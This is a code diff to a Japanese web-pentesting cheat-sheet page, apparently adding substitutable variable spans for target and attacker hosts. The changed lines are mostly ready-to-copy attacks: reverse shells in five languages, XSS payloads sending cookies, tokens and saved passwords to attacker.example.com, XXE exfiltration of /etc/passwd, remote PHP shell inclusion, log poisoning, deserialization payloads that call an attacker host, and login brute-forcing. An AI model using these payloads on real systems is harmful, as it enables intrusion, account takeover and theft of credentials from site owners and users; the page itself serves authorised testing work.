@@ -209,38 +209,38 @@
 
       <h3>技術スタック特定</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ヘッダ / 技術指紋</span>
-whatweb -a 3 https://target.example.com
-curl -sI https://target.example.com
-nuclei -u https://target.example.com -t http/technologies/
+whatweb -a 3 https://<span class="v" data-var="TARGET">target.example.com</span>
+curl -sI https://<span class="v" data-var="TARGET">target.example.com</span>
+nuclei -u https://<span class="v" data-var="TARGET">target.example.com</span> -t http/technologies/
 
 <span class="c"># WAF 検出</span>
-wafw00f https://target.example.com</code></pre></div>
+wafw00f https://<span class="v" data-var="TARGET">target.example.com</span></code></pre></div>
 
       <h3>コンテンツ探索 (ディレクトリ / ファイル)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ffuf — ディレクトリ / ファイル探索</span>
-ffuf -u https://target.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403
-ffuf -u https://target.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.bak,.old,.txt,.zip
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.bak,.old,.txt,.zip
 
 <span class="c"># 再帰探索 + フィルタ</span>
-ffuf -u https://target.example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -fc 404 -fs 0
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span>/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -fc 404 -fs 0
 
 <span class="c"># feroxbuster (自動再帰)</span>
-feroxbuster -u https://target.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt</code></pre></div>
+feroxbuster -u https://<span class="v" data-var="TARGET">target.example.com</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt</code></pre></div>
 
       <h3>vhost / サブドメイン列挙</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># vhost fuzzing (Host ヘッダ)</span>
-ffuf -u https://target.example.com -H "Host: FUZZ.target.example.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span> -H "Host: FUZZ.target.example.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
 
 <span class="c"># サブドメイン列挙</span>
-subfinder -d target.example.com -silent | httpx -silent -title -tech-detect</code></pre></div>
+subfinder -d <span class="v" data-var="TARGET">target.example.com</span> -silent | httpx -silent -title -tech-detect</code></pre></div>
 
       <h3>パラメータ発見</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># arjun — 隠れた HTTP パラメータ発見</span>
-arjun -u "https://target.example.com/api/endpoint" -m GET
-arjun -u "https://target.example.com/api/endpoint" -m POST
+arjun -u "https://<span class="v" data-var="TARGET">target.example.com</span>/api/endpoint" -m GET
+arjun -u "https://<span class="v" data-var="TARGET">target.example.com</span>/api/endpoint" -m POST
 
 <span class="c"># paramspider — アーカイブからパラメータ収集</span>
-paramspider -d target.example.com</code></pre></div>
+paramspider -d <span class="v" data-var="TARGET">target.example.com</span></code></pre></div>
 
       <div class="note"><span class="lbl">Burp workflow</span>
         Proxy → Target → Site map でクロール結果を可視化。Target → Scope に対象を追加し "Show only in-scope items" で絞る。Engagement tools → Discover content でコンテンツ探索、Analyze target で攻撃面把握。Burp の passive scan を有効化しつつ手動でサイトを巡回すると、technology fingerprint と潜在的な脆弱パラメータが自動収集される。
@@ -271,18 +271,18 @@ paramspider -d target.example.com</code></pre></div>
 
       <h3>ログイン攻撃 (bruteforce / user enum)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ffuf — POST ログインブルートフォース</span>
-ffuf -u https://target.example.com/login -X POST \
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span>/login -X POST \
   -d "username=admin&amp;password=FUZZ" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -w /usr/share/seclists/Passwords/rockyou.txt \
   -fr "Invalid credentials"
 
 <span class="c"># hydra — HTTP POST form</span>
-hydra -l admin -P /usr/share/wordlists/rockyou.txt target.example.com \
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <span class="v" data-var="TARGET">target.example.com</span> \
   http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid credentials"
 
 <span class="c"># ユーザ列挙 (レスポンス差分 / タイミング)</span>
-ffuf -u https://target.example.com/login -X POST \
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span>/login -X POST \
   -d "username=FUZZ&amp;password=test" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
@@ -318,11 +318,11 @@ jwt_tool eyJhbGci... -I -hc kid -hv "../../dev/null"</code></pre></div>
 
       <h3>OAuth 2.0 / OIDC</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code><span class="c"># redirect_uri 検証不備 — 認可コード奪取</span>
-GET /authorize?client_id=xxx&amp;redirect_uri=https://attacker.example.com&amp;response_type=code&amp;scope=openid HTTP/1.1
+GET /authorize?client_id=xxx&amp;redirect_uri=https://<span class="v" data-var="ATTACKER">attacker.example.com</span>&amp;response_type=code&amp;scope=openid HTTP/1.1
 
 <span class="c"># redirect_uri の path traversal / サブドメイン許容の悪用</span>
 redirect_uri=https://target.example.com.attacker.example.com
-redirect_uri=https://target.example.com/callback/../redirect?url=attacker
+redirect_uri=https://<span class="v" data-var="TARGET">target.example.com</span>/callback/../redirect?url=attacker
 
 <span class="c"># state パラメータ欠如 → CSRF (アカウント連携の乗っ取り)</span>
 <span class="c"># response_type=token (implicit) のトークン漏洩</span></code></pre></div>
@@ -365,8 +365,8 @@ echo "SAMLResponse..." | base64 -d | xmllint --format -
 
       <h3>IDOR (Insecure Direct Object Reference)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 数値 ID の総当たり (他ユーザリソースへの水平アクセス)</span>
-ffuf -u "https://target.example.com/api/user/FUZZ/profile" \
-  -H "Authorization: Bearer &lt;TOKEN&gt;" \
+ffuf -u "https://<span class="v" data-var="TARGET">target.example.com</span>/api/user/FUZZ/profile" \
+  -H "Authorization: Bearer <span class="v">&lt;TOKEN&gt;</span>" \
   -w &lt;(seq 1 10000) -mc 200 -fr "Access denied"
 
 <span class="c"># UUID / ハッシュ ID の漏洩元探索 (他エンドポイントからの ID 収集)</span>
@@ -431,7 +431,7 @@ X-Original-URL: /admin/config</code></pre></div>
 ' AND SLEEP(5)-- -                      <span class="c"># MySQL time-based</span>
 
 <span class="c"># sqlmap — 自動化</span>
-sqlmap -u "https://target.example.com/item?id=1" --batch --dbs
+sqlmap -u "https://<span class="v" data-var="TARGET">target.example.com</span>/item?id=1" --batch --dbs
 sqlmap -r request.txt --batch --level 5 --risk 3 --dbs      <span class="c"># Burp 保存リクエストから</span>
 sqlmap -u "..." --dbms=mysql -D appdb -T users --dump
 
@@ -538,7 +538,7 @@ $(id)
 ;i\d
 ;cat${IFS}/etc/passwd    <span class="c"># スペースフィルタ回避</span>
 ;wh$()oami               <span class="c"># 空の command substitution で blocklist 文字列を分断</span>
-;n$()c -nvlp 4444</code></pre></div>
+;n$()c -nvlp <span class="v" data-var="LPORT">4444</span></code></pre></div>
 
       <div class="note"><span class="lbl">正規化・sanitize の突破</span>
         <ul>
@@ -551,15 +551,15 @@ $(id)
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># reverse shell 取得 (言語別、注入先の実行環境に合わせる)</span>
 <span class="c"># bash</span>
-bash -c 'bash -i >&amp; /dev/tcp/&lt;LHOST&gt;/4444 0>&amp;1'
+bash -c 'bash -i >&amp; /dev/tcp/<span class="v">&lt;LHOST&gt;</span>/<span class="v" data-var="LPORT">4444</span> 0>&amp;1'
 <span class="c"># python</span>
-python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;LHOST&gt;",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<span class="v">&lt;LHOST&gt;</span>",<span class="v" data-var="LPORT">4444</span>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
 <span class="c"># php</span>
-php -r '$s=fsockopen("&lt;LHOST&gt;",4444);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'
+php -r '$s=fsockopen("<span class="v">&lt;LHOST&gt;</span>",<span class="v" data-var="LPORT">4444</span>);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'
 <span class="c"># perl</span>
-perl -e 'use Socket;$i="&lt;LHOST&gt;";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");'
+perl -e 'use Socket;$i="<span class="v">&lt;LHOST&gt;</span>";$p=<span class="v" data-var="LPORT">4444</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");'
 <span class="c"># node.js</span>
-require('child_process').spawnSync('/bin/sh',['-c','bash -i >&amp; /dev/tcp/&lt;LHOST&gt;/4444 0>&amp;1'])</code></pre></div>
+require('child_process').spawnSync('/bin/sh',['-c','bash -i >&amp; /dev/tcp/<span class="v">&lt;LHOST&gt;</span>/<span class="v" data-var="LPORT">4444</span> 0>&amp;1'])</code></pre></div>
 
       <h3>SSTI (Server-Side Template Injection)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 検出 polyglot</span>
@@ -606,7 +606,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}</code></pre></div>
 <span class="c"># {{7*7}} が評価されない (logic-less) 点で SSTI エンジンから両者を切り分け</span>
 
 <span class="c"># tplmap — 自動化</span>
-<span class="c"># tplmap -u "https://target.example.com/page?name=test"</span></code></pre></div>
+<span class="c"># tplmap -u "https://<span class="v" data-var="TARGET">target.example.com</span>/page?name=test"</span></code></pre></div>
 
       <div class="note"><span class="lbl">Burp workflow</span>
         Injection 系は Repeater で手動 payload を試し、Intruder で payload リストを総当たりが基本。SQLi は Burp で脆弱リクエストを保存 (右クリック → Save item) し、<code>sqlmap -r</code> に渡す連携が効率的。<b>ActiveScan++</b> 拡張で out-of-band 検出を強化、Collaborator で blind / OOB (SQLi time-based, command injection DNS) を確認。<b>Hackvertor</b> でエンコーディングチェーンを組み、WAF 回避 payload を動的生成。
@@ -647,12 +647,12 @@ ${"freemarker.template.utility.Execute"?new()("id")}</code></pre></div>
 
 <span class="c"># ysoserial — gadget chain 生成</span>
 java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0
-java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.example.com' | base64 -w0
-java -jar ysoserial.jar CommonsBeanutils1 'curl attacker.example.com/x' | base64 -w0
+java -jar ysoserial.jar CommonsCollections5 'nslookup <span class="v" data-var="ATTACKER">attacker.example.com</span>' | base64 -w0
+java -jar ysoserial.jar CommonsBeanutils1 'curl <span class="v" data-var="ATTACKER">attacker.example.com</span>/x' | base64 -w0
 
 <span class="c"># gadget 探索 (どの chain が通るか未知の場合)</span>
 <span class="c"># URLDNS で疎通確認 (RCE gadget がなくても DNS で検出可能)</span>
-java -jar ysoserial.jar URLDNS "http://attacker.example.com" | base64 -w0</code></pre></div>
+java -jar ysoserial.jar URLDNS "http://<span class="v" data-var="ATTACKER">attacker.example.com</span>" | base64 -w0</code></pre></div>
 
       <div class="note"><span class="lbl">Java gadget chain 選定基準</span>
         <ul>
@@ -680,7 +680,7 @@ O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
 
 <span class="c"># ViewState (ASP.NET) — MAC 無効 or 鍵漏洩時</span>
 <span class="c"># ysoserial.exe -p ViewState -g TextFormattingRunProperties \</span>
-<span class="c">#   --generator=&lt;GENERATOR&gt; --validationkey=&lt;KEY&gt; --validationalg=SHA1 -c "cmd"</span></code></pre></div>
+<span class="c">#   --generator=<span class="v">&lt;GENERATOR&gt;</span> --validationkey=<span class="v">&lt;KEY&gt;</span> --validationalg=SHA1 -c "cmd"</span></code></pre></div>
 
       <h3>Python</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">python</span><button class="copy">copy</button></div><pre><code><span class="c"># pickle — __reduce__ による RCE</span>
@@ -776,17 +776,17 @@ expect://id</code></pre></div>
       <p>読み取り専用に見える LFI も、攻撃者制御下のコンテンツをサーバ側ファイルに書き込んでから include させれば RCE に発展する。ログ / セッション / アップロードファイルが典型的な「注入先」。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># (1) Log Poisoning — User-Agent に PHP コードを注入 → ログを include</span>
-curl -A '&lt;?php system($_GET["c"]); ?&gt;' https://target.example.com/
+curl -A '&lt;?php system($_GET["c"]); ?&gt;' https://<span class="v" data-var="TARGET">target.example.com</span>/
 <span class="c"># 続けて LFI でログを取り込み実行</span>
-https://target.example.com/page.php?file=/var/log/apache2/access.log&amp;c=id
+https://<span class="v" data-var="TARGET">target.example.com</span>/page.php?file=/var/log/apache2/access.log&amp;c=id
 <span class="c"># SSH の認証ログ (/var/log/auth.log) も同様、ユーザ名に PHP コードを仕込む</span></code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># (2) PHP Session Poisoning — セッションファイルに PHP コードを残す</span>
 <span class="c"># username 等の反映される入力に PHP コードを入れてログイン試行</span>
 <span class="c"># セッションファイルの典型パス:</span>
-<span class="c">#   /var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</span>
-<span class="c">#   /tmp/sess_&lt;PHPSESSID&gt;  /var/lib/php5/</span>
-https://target.example.com/page.php?file=/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;&amp;c=id</code></pre></div>
+<span class="c">#   /var/lib/php/sessions/sess_<span class="v">&lt;PHPSESSID&gt;</span></span>
+<span class="c">#   /tmp/sess_<span class="v">&lt;PHPSESSID&gt;</span>  /var/lib/php5/</span>
+https://<span class="v" data-var="TARGET">target.example.com</span>/page.php?file=/var/lib/php/sessions/sess_<span class="v">&lt;PHPSESSID&gt;</span>&amp;c=id</code></pre></div>
 
       <div class="note"><span class="lbl">Note</span>
         セッション / ログの正確なパスは <code>phpinfo</code> (<code>session.save_path</code> / ログ設定) が読めれば確定できる。<code>phpinfo.php</code> の露出、または LFI で <code>php://filter</code> 経由に設定ファイルを読むことで特定する。アップロード機能があれば、画像偽装した PHP を上げてそのパスを include する経路が最短。
@@ -794,7 +794,7 @@ https://target.example.com/page.php?file=/var/lib/php/sessions/sess_&lt;PHPSESSI
 
       <h3>RFI (Remote File Inclusion)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># allow_url_include=On の場合、攻撃者サーバのコードを直接 include</span>
-https://target.example.com/page.php?file=http://attacker.example.com/shell.txt
+https://<span class="v" data-var="TARGET">target.example.com</span>/page.php?file=http://<span class="v" data-var="ATTACKER">attacker.example.com</span>/shell.txt
 <span class="c"># shell.txt に &lt;?php system($_GET["c"]); ?&gt; を配置</span></code></pre></div>
 
       <div class="note"><span class="lbl">Burp workflow</span>
@@ -829,7 +829,7 @@ https://target.example.com/page.php?file=http://attacker.example.com/shell.txt
       <h3>SSRF (Server-Side Request Forgery)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># クラウドメタデータ (認証情報奪取)</span>
 http://169.254.169.254/latest/meta-data/iam/security-credentials/    <span class="c"># AWS</span>
-http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="v">&lt;ROLE&gt;</span>
 http://metadata.google.internal/computeMetadata/v1/    <span class="c"># GCP (要 Metadata-Flavor: Google)</span>
 http://169.254.169.254/metadata/instance?api-version=2021-02-01    <span class="c"># Azure</span>
 
@@ -863,11 +863,11 @@ http://[::1]/               <span class="c"># IPv6</span></code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ffuf と組み合わせた内部ポートスキャン</span>
 <span class="c"># SSRF 可能なパラメータ / ヘッダの FUZZ 位置にポート番号を流す</span>
-ffuf -u "https://target.example.com/fetch?url=http://127.0.0.1:FUZZ" \
+ffuf -u "https://<span class="v" data-var="TARGET">target.example.com</span>/fetch?url=http://127.0.0.1:FUZZ" \
   -w &lt;(seq 0 65535) -ac
 
 <span class="c"># プロキシ系ヘッダ経由の SSRF (実装依存のヘッダ名)</span>
-ffuf -u https://target.example.com -H "X-Forwarded-Host: 127.0.0.1:FUZZ" \
+ffuf -u https://<span class="v" data-var="TARGET">target.example.com</span> -H "X-Forwarded-Host: 127.0.0.1:FUZZ" \
   -w &lt;(seq 1 10000) -ac</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Gopher — 任意 TCP パケット (Redis / SMTP へのコマンド注入)</span>
@@ -895,18 +895,18 @@ gopher://127.0.0.1:6379/_SET%20key%20value
 &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;
 
 <span class="c">&lt;!-- OOB 抽出 (blind XXE、外部 DTD) --&gt;</span>
-&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://attacker.example.com/evil.dtd"&gt; %ext;]&gt;</code></pre></div>
+&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://<span class="v" data-var="ATTACKER">attacker.example.com</span>/evil.dtd"&gt; %ext;]&gt;</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">xml</span><button class="copy">copy</button></div><pre><code><span class="c">&lt;!-- evil.dtd (OOB 抽出用外部 DTD) --&gt;</span>
 &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
-&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.example.com/?x=%file;'&gt;"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://<span class="v" data-var="ATTACKER">attacker.example.com</span>/?x=%file;'&gt;"&gt;
 %eval;
 %exfil;</code></pre></div>
 
       <h3>XXE against JSON (Content-Type 切替)</h3>
       <p>JSON を受け付けるエンドポイントでも、XML パーサが背後にある場合は Content-Type を <code>application/xml</code> に変え、body を XML に書き換えることで XXE が成立しうる。JSON API だからと XXE を除外しない。</p>
       <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code>POST /api/endpoint HTTP/1.1
-Host: target.example.com
+Host: <span class="v" data-var="TARGET">target.example.com</span>
 Accept: application/json
 Content-Type: application/xml
 
@@ -963,11 +963,11 @@ Content-Type: application/xml
 javascript:alert(1)     <span class="c"># href / src コンテキスト</span></code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c">// Cookie 窃取 (HttpOnly 未設定時) — img / fetch 両パターン</span>
-&lt;script&gt;new Image().src='https://attacker.example.com/?c='+document.cookie&lt;/script&gt;
-&lt;script&gt;fetch('https://attacker.example.com/?c='+encodeURIComponent(document.cookie))&lt;/script&gt;
+&lt;script&gt;new Image().src='https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;fetch('https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/?c='+encodeURIComponent(document.cookie))&lt;/script&gt;
 
 <span class="c">// キーロガー / セッション hijack 用トークン送出</span>
-&lt;script&gt;fetch('https://attacker.example.com/?t='+localStorage.getItem('token'))&lt;/script&gt;</code></pre></div>
+&lt;script&gt;fetch('https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/?t='+localStorage.getItem('token'))&lt;/script&gt;</code></pre></div>
 
       <div class="note"><span class="lbl">XSS 類型と検証</span>
         <ul>
@@ -983,24 +983,24 @@ javascript:alert(1)     <span class="c"># href / src コンテキスト</span></
 <span class="c">// sink:   innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / setTimeout</span>
 
 <span class="c">// Blind XSS — 遅延実行環境で外部スクリプトを読み込む</span>
-&lt;script src=https://attacker.example.com/x.js&gt;&lt;/script&gt;
-"&gt;&lt;script src=https://attacker.example.com/x.js&gt;&lt;/script&gt;</code></pre></div>
+&lt;script src=https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/x.js&gt;&lt;/script&gt;
+"&gt;&lt;script src=https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/x.js&gt;&lt;/script&gt;</code></pre></div>
 
       <p><b>XSS Exploitation の発展</b> — XSS の価値は alert ではなく被害者ブラウザの権限で行動すること。長い payload は文字数制限を避けるため外部スクリプト読込に逃がすのが定石。以下は代表的な exploitation。</p>
       <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c">// 外部スクリプトに逃がす (img/onerror から動的 script 挿入)</span>
-&lt;img src=x onerror="var s=document.createElement('script');s.src='https://attacker.example.com/x.js';document.body.appendChild(s)"&gt;
+&lt;img src=x onerror="var s=document.createElement('script');s.src='https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/x.js';document.body.appendChild(s)"&gt;
 
 <span class="c">// Saved Password 窃取 — 偽の input を DOM 挿入し browser autofill を誘発</span>
 var u=document.createElement('input'); u.type='text'; u.style.position='fixed';
 var p=document.createElement('input'); p.type='password'; p.style.position='fixed';
 document.body.append(u); document.body.append(p);
-setTimeout(function(){ fetch('https://attacker.example.com/?u='+u.value+'&amp;p='+p.value) },5000);
+setTimeout(function(){ fetch('https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/?u='+u.value+'&amp;p='+p.value) },5000);
 
 <span class="c">// Phishing — ページ全体を書き換え、form action を攻撃者サーバへ</span>
 fetch('/login').then(r=&gt;r.text()).then(d=&gt;{
   document.documentElement.innerHTML=d;
   var f=document.getElementsByTagName('form')[0];
-  f.action='https://attacker.example.com/'; f.method='get';
+  f.action='https://<span class="v" data-var="ATTACKER">attacker.example.com</span>/'; f.method='get';
 });</code></pre></div>
 
       <div class="note"><span class="lbl">XSS-driven CSRF (Session Riding)</span>
@@ -1009,7 +1009,7 @@ fetch('/login').then(r=&gt;r.text()).then(d=&gt;{
 
       <h3>CSRF (Cross-Site Request Forgery)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">html</span><button class="copy">copy</button></div><pre><code><span class="c">&lt;!-- トークン欠如時の自動送信フォーム --&gt;</span>
-&lt;form action="https://target.example.com/account/email" method="POST" id="c"&gt;
+&lt;form action="https://<span class="v" data-var="TARGET">target.example.com</span>/account/email" method="POST" id="c"&gt;
   &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
 &lt;/form&gt;
 &lt;script&gt;document.getElementById('c').submit()&lt;/script&gt;
@@ -1027,23 +1027,23 @@ fetch('/login').then(r=&gt;r.text()).then(d=&gt;{
 
       <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code><span class="c"># CORS preflight (非単純リクエストで OPTIONS が先行)</span>
 OPTIONS /api/data HTTP/1.1
-Host: target.example.com
-Origin: https://attacker.example.com
+Host: <span class="v" data-var="TARGET">target.example.com</span>
+Origin: https://<span class="v" data-var="ATTACKER">attacker.example.com</span>
 Access-Control-Request-Method: POST
 Access-Control-Request-Headers: X-Custom
 
 <span class="c"># 危険なレスポンス — Origin 反射 + credentials 許可</span>
-Access-Control-Allow-Origin: https://attacker.example.com
+Access-Control-Allow-Origin: https://<span class="v" data-var="ATTACKER">attacker.example.com</span>
 Access-Control-Allow-Credentials: true</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Origin 反射 + credentials 許可の検証</span>
-curl -s -I https://target.example.com/api/data -H "Origin: https://attacker.example.com"
+curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/api/data -H "Origin: https://<span class="v" data-var="ATTACKER">attacker.example.com</span>"
 <span class="c"># Access-Control-Allow-Origin が Origin をそのまま反射し</span>
 <span class="c"># Access-Control-Allow-Credentials: true なら情報奪取可能</span>
 
 <span class="c"># null origin / サブドメイン / 前方一致バイパスの検証</span>
-curl -s -I https://target.example.com/api/data -H "Origin: null"
-curl -s -I https://target.example.com/api/data -H "Origin: https://target.example.com.attacker.example.com"</code></pre></div>
+curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/api/data -H "Origin: null"
+curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/api/data -H "Origin: https://target.example.com.attacker.example.com"</code></pre></div>
 
       <div class="note"><span class="lbl">Burp workflow</span>
         XSS は Repeater でコンテキスト (HTML body / 属性 / JS / URL) ごとに payload を試し、<b>DOM Invader</b> (Burp 内蔵ブラウザ) で DOM XSS の source→sink を自動追跡。反射 XSS は Intruder で XSS payload リストを流し、レスポンスに payload がエスケープされず出現するか判定。CORS は <b>passive scan</b> が Origin 反射を検出。CSRF PoC は Engagement tools → Generate CSRF PoC で自動生成できる。
@@ -1081,8 +1081,8 @@ curl -s -I https://target.example.com/api/data -H "Origin: https://target.exampl
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># curl の並行実行で同一リクエストを同時発火 (簡易検証)</span>
 for i in $(seq 1 30); do
-  curl -sk "https://target.example.com/api/coupon/apply" \
-    -H "Authorization: Bearer &lt;TOKEN&gt;" \
+  curl -sk "https://<span class="v" data-var="TARGET">target.example.com</span>/api/coupon/apply" \
+    -H "Authorization: Bearer <span class="v">&lt;TOKEN&gt;</span>" \
     -d '{"code":"SAVE50"}' &amp;
 done; wait</code></pre></div>
 
@@ -1127,14 +1127,14 @@ done; wait</code></pre></div>
         </ul>
       </div>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># セキュリティヘッダの確認</span>
-curl -sI https://target.example.com | grep -iE 'content-security-policy|x-frame-options|strict-transport|x-content-type'
+curl -sI https://<span class="v" data-var="TARGET">target.example.com</span> | grep -iE 'content-security-policy|x-frame-options|strict-transport|x-content-type'
 
 <span class="c"># nuclei の misconfiguration テンプレート</span>
-nuclei -u https://target.example.com -t http/misconfiguration/
+nuclei -u https://<span class="v" data-var="TARGET">target.example.com</span> -t http/misconfiguration/
 
 <span class="c"># 公開 S3 バケットの確認</span>
-curl -s https://&lt;BUCKET&gt;.s3.amazonaws.com/
-aws s3 ls s3://&lt;BUCKET&gt;/ --no-sign-request</code></pre></div>
+curl -s https://<span class="v">&lt;BUCKET&gt;</span>.s3.amazonaws.com/
+aws s3 ls s3://<span class="v">&lt;BUCKET&gt;</span>/ --no-sign-request</code></pre></div>
 
       <h3>Insecure Design</h3>
       <p>実装ミスや設定ミスではなく、アーキテクチャ / 設計そのものに内在する欠陥。脅威モデリング不足が原因で、コードが「仕様通り」でも脆弱になる。</p>
@@ -1150,15 +1150,15 @@ aws s3 ls s3://&lt;BUCKET&gt;/ --no-sign-request</code></pre></div>
       <h3>Vulnerable &amp; Outdated Components</h3>
       <p>既知の脆弱性を持つライブラリ / フレームワーク / ソフトウェアの使用。既製の exploit が Exploit-DB 等に存在すれば、攻撃者の労力は最小で済む。</p>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># バージョン指紋 → 既知 CVE 照合</span>
-whatweb -a 3 https://target.example.com
-nuclei -u https://target.example.com -t http/cves/ -t http/vulnerabilities/
+whatweb -a 3 https://<span class="v" data-var="TARGET">target.example.com</span>
+nuclei -u https://<span class="v" data-var="TARGET">target.example.com</span> -t http/cves/ -t http/vulnerabilities/
 
 <span class="c"># CMS 別スキャナ</span>
-wpscan --url https://target.example.com --enumerate vp,vt,u
-droopescan scan drupal -u https://target.example.com
+wpscan --url https://<span class="v" data-var="TARGET">target.example.com</span> --enumerate vp,vt,u
+droopescan scan drupal -u https://<span class="v" data-var="TARGET">target.example.com</span>
 
 <span class="c"># 既知 exploit 検索</span>
-searchsploit &lt;PRODUCT&gt; &lt;VERSION&gt;</code></pre></div>
+searchsploit <span class="v">&lt;PRODUCT&gt;</span> <span class="v">&lt;VERSION&gt;</span></code></pre></div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
@@ -1188,25 +1188,25 @@ searchsploit &lt;PRODUCT&gt; &lt;VERSION&gt;</code></pre></div>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># メソッド総当たり (制限された操作の露出)</span>
